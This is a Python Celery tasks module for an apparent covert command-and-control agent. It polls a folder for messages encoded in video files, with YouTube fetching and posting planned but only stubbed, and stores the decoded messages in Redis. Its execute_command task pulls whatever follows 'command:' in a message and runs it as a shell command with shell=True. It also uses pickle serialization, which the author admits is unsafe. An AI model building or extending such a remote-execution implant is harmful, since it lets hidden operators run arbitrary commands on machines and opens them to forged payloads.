from datetime import datetime
from pathlib import Path
import re
import subprocess

from celery import Celery, Task
from celery.utils.log import get_task_logger

import dddb

from . import cfg
from . import messages
from . import util

# Apparently this is how Celery does logging for tasks.
logger = get_task_logger(__name__)

# TODO: shouldn't these be configuration vars? how would you get the config to
# this file in the first place?
DEFAULT_ENV_PATH = Path("./common.env")
REDIS_FILES_SEEN_KEY = "_agent_meta-msgs"
REDIS_INTERNAL_MSG_PREFIX = "agent-msg-parsed-"
REDIS_COMPLETED_CMDS_KEY = "_agent_meta-cmds"
app = Celery(
    "tasks", backend="redis://localhost:6379/0", broker="redis://localhost:6379/0"
)

app.conf.timezone = "America/Los_Angeles"
app.conf.accept_content = ["pickle", "json"]

# You can use this to prefix keys, but they'll still have _celery-task-meta-{id}
# at the end. So there's not really much point unless you're fighting with other
# applications on the same Redis instance.
# app.conf.result_backend_transport_options = {'global_keyprefix': 'my_prefix_'}


@app.on_after_configure.connect
def setup_periodic_tasks(sender, **kwargs):
    cfg_obj = cfg.Config.from_env_file(DEFAULT_ENV_PATH)
    sender.add_periodic_task(
        5.0,
        check_new_msgs.s(cfg_obj.MESSAGE_DIR, cfg_obj.DECODED_DIR),
        name="check for new messages",
    )
    sender.add_periodic_task(
        5.0,
        download_yt_videos.s(cfg_obj.MESSAGE_DIR),
        name="check for new youtube videos",
    )


@app.task(serializer="pickle")
def download_yt_videos(encoded_msg_dir: Path, suffix: str = ".mp4") -> None:
    """
    Download all videos not previously seen.

    Whether or not a video is downloaded is determined by whether or not {video_id}.mp4
    exists in `encoded_msg_dir`. If it does, the video is assumed to have already
    been downloaded.

    This does not do anything on its own; it is assumed that the check_new_msgs()
    task will act accordingly.
    """
    # no clue how this will work lol
    # iterator over all available videos, or at least one
    for _ in range(69, 420):
        yt_video_id: str = "???"
        target_path = (
            encoded_msg_dir / Path(str(yt_video_id)).with_suffix(suffix)
        ).resolve()
        if target_path.exists():
            logger.debug(f"Ignoring {yt_video_id=}, as it appears to already exist")
            continue

        # download and write to target path
        # dddb.remote.youtube.download(str(target_path)
        # logger.info("Downloaded {yt_video_id=} to {target_path}")


# TODO: pickle is unsafe but (on paper) we just want this to work
#
# if someone wants to forge a message they can figure out the key and hmac anyways
@app.task(serializer="pickle")
def check_new_msgs(encoded_msg_dir: Path, decoded_msg_dir: Path) -> list[str]:
    """
    Check for new video-encoded messages.

    The filenames of recently processed raw messages are stored in a Redis set
    whose key is "_agent_meta-msgs". If a filename in the target directory
    has NOT been seen, it is returned as part of the result, then added to
    the returning Redis set.

    The associated dictionary of each message is stored as agent-msg-parsed-{uuid}.
    The keys of each generated dictionary is returned as part of the list;
    the corresponding Redis entry can then be obtained and parsed into an
    AgentMessage as needed.

    When no UUID is included with a message, it is automatically assigned one.

    If a message fails to be decoded as JSON, an AgentMessage is created whose

    """
    # Create new Redis connection (for this worker)
    redis_con = util.get_redis_con(app)

    # Perform recursive iteration on the folder to find all available (presumed)
    # messages
    all_files: set[bytes] = set()
    for path in encoded_msg_dir.glob("**/*"):
        if path.is_dir():
            continue
        # Redis stores set members as bytes for whatever reason
        all_files.add(bytes(path.resolve()))

    if not all_files:
        logger.info(f"No files found in {encoded_msg_dir}")
        return []

    # Check which files are new based on _agent_meta-msgs; add new files to the
    # set referenced by the key.
    seen_files = redis_con.smembers(REDIS_FILES_SEEN_KEY)
    logger.info(f"Seen files: {seen_files}")
    new_strs: set[bytes] = all_files - seen_files
    logger.info(f"New strings: {new_strs}")
    if new_strs:
        redis_con.sadd(REDIS_FILES_SEEN_KEY, *new_strs)

    # Convert back to Path objects
    new_files: list[Path] = [Path(p.decode()) for p in new_strs]

    # Decode each message and convert to AgentMessage.
    msgs_keys: list[str] = []
    for new_file in new_files:
        msg: messages.AgentMessage = messages.AgentMessage.from_encoded_file(
            new_file, decoded_msg_dir
        )
        msg_key = REDIS_INTERNAL_MSG_PREFIX + str(msg.msg_id)
        msgs_keys.append(msg_key)

        # Insert AgentMessage as JSON string to Redis database
        redis_con.set(msg_key, msg.model_dump_json())

    # Return as list of Redis keys (which may or may not be used)
    return msgs_keys


@app.task(serializer="pickle")
def write_msg(msg: messages.AgentMessage, cfg_obj: cfg.Config) -> None:
    """
    Task to write message to the configured path as an encoded video.

    TODO: This should throw onto YouTube in the future, i.e. by using the
    built-in write-to-disk functionality and then using dddb again; this
    function should be given the target URL/login information as a result
    """
    # Right now, it's literally just a one-step process
    msg.to_encoded_file(cfg_obj.DECODED_DIR, cfg_obj.OUTGOING_DIR)

    # But depending on how DDDB works, you'd then do the whole upload
    # thing separately; most likely, this would accept a specific protocol
    # string, which then passes all this stuff to the protocol handler. that
    # handler would then contain stuff about "what's the next video title?"
    # and upload accordingly...


@app.task(bind=True, serializer="pickle")
def execute_command(self: Task, cmd_str: str) -> dict:
    """
    Execute a command.

    The net result should be a constructed AgentMessage of command_response type,
    as built by the relevant command handler chosen by the command dispatch
    (which might be this task?).

    To prevent the agent from stalling while commands are executed, this is fully
    asynchronous. The results of tasks are simply logged out at the INFO level.

    The direct result is a dictionary. The task ID of this request is added to
    REDIS_COMPLETED_TASKS_KEY, a set of task IDs.

    The format is as follows:
    {
        'cmd_str': str
        'stdout': bytes
        'stderr': bytes
        'start_time': float
        'end_time': float
    }
    """
    r = re.search(r"(?:.*)(?:command:)(.*)", cmd_str)
    if not r:
        raise RuntimeError(f"`command` directive absent from {cmd_str}")

    command = r.group(1)
    logger.info(f"Running {command} as shell command")
    # very dangerous!!
    start_time = datetime.utcnow().timestamp()
    # TODO: timeout is there for now to avoid instantly bricking everything
    cmd_result = subprocess.run(command, capture_output=True, shell=True, timeout=60)
    end_time = datetime.utcnow().timestamp()

    redis_con = util.get_redis_con(app)
    redis_con.sadd(REDIS_COMPLETED_CMDS_KEY, self.request.id)  # type: ignore

    # TODO: this internal message ought to be a pydantic model too lol -
    # makes returning the command result a lot cleaner.
    #
    # wouldn't it just make sense to have a pydantic model called GenericMessage
    # and then have a bunch of specific message types inherit?
    result = {
        "cmd_str": command,
        "stdout": cmd_result.stdout,
        "stderr": cmd_result.stderr,
        "start_time": start_time,
        "end_time": end_time,
    }

    return result
